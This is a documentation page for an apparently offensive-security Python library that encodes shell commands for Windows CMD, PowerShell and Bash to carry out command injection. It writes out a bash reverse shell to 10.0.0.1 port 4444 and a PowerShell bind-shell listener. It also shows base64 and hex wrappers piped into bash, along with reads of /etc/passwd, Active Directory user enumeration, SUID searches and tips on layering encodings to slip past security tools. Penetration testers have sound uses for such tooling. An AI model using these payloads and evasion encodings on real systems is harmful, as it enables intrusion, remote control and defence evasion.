```markdown
# Shell Command Encoding Guide

## Overview
Shell command encoding is crucial for payload generation and command injection testing. This module provides encoders for different shell environments including Windows CMD, PowerShell, and Bash.

## Supported Shells

### Windows CMD
```python
from shellkit.encoders.shell import CommandEncoder

cmd_encoder = CommandEncoder()
encoded = cmd_encoder.encode('dir & type secret.txt')
# Result: dir ^& type secret.txt
```

### PowerShell
```python
from shellkit.encoders.shell import PowerShellEncoder

ps_encoder = PowerShellEncoder()

# Character escaping
escaped = ps_encoder.encode('Get-Process | Where-Object {$_.CPU -gt 50}')
# Result: Get-Process `| Where-Object `{`$`_.CPU `-gt 50`}

# Base64 encoding
b64_encoded = ps_encoder.encode('Get-Process', method='base64')
# Result: powershell -enc RABlAHQALQBQAHIAbwBjAGUAcwBzAA==
```

### Bash
```python
from shellkit.encoders.shell import BashEncoder

bash_encoder = BashEncoder()

# Character escaping
escaped = bash_encoder.encode('cat /etc/passwd | grep root')
# Result: cat\ /etc/passwd\ \|\ grep\ root

# Base64 encoding
b64_encoded = bash_encoder.encode('cat /etc/passwd', method='base64')
# Result: echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Hex encoding
hex_encoded = bash_encoder.encode('cat /etc/passwd', method='hex')
# Result: echo 636174202f6574632f706173737764 | xxd -p -r | bash
```

## Encoding Methods

### Character Escaping
- Escapes special characters with appropriate shell-specific escape sequences
- Maintains command readability
- Useful for basic command injection

### Base64 Encoding
- Encodes entire command in base64
- Helps bypass character restrictions
- Commonly used in one-liners

### Hex Encoding (Bash Only)
- Encodes command as hex string
- Alternative to base64 encoding
- Useful when base64 is blocked

## Usage Examples

### Command Injection
```python
# Windows CMD
cmd = 'whoami & net user'
encoded_cmd = cmd_encoder.encode(cmd)

# PowerShell
ps = 'Get-ADUser -Filter * | Select-Object Name'
encoded_ps = ps_encoder.encode(ps, method='base64')

# Bash
bash = 'find / -perm -4000 -type f'
encoded_bash = bash_encoder.encode(bash, method='base64')
```

### Payload Generation
```python
# Create reverse shell
bash_cmd = "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
encoded = bash_encoder.encode(bash_cmd, method='base64')

# Create bind shell
ps_cmd = "New-Object System.Net.Sockets.TCPListener(4444)"
encoded = ps_encoder.encode(ps_cmd, method='base64')
```

## Best Practices
1. Choose appropriate encoding method based on target environment
2. Test encoded commands in safe environment first
3. Consider command length limitations
4. Be aware of shell-specific quirks
5. Use proper error handling

## Common Issues
1. Command length limitations
2. Shell-specific character restrictions
3. Encoding detection by security tools
4. Execution context differences

## Security Considerations
1. Encoded commands may be flagged by security tools
2. Some encoding methods are well-known IoCs
3. Consider using multiple encoding layers
4. Test against target security controls

## Examples by Context

### Web Application Testing
```python
# SQL Injection with command execution
cmd = ';netstat -an --'
encoded = cmd_encoder.encode(cmd)

# File read with PowerShell
ps = 'Get-Content sensitive.txt'
encoded = ps_encoder.encode(ps, method='base64')
```

### System Testing
```python
# Privilege escalation check
bash = 'sudo -l && id'
encoded = bash_encoder.encode(bash, method='hex')

# Network enumeration
ps = 'Test-NetConnection -ComputerName target -Port 445'
encoded = ps_encoder.encode(ps, method='base64')
```
```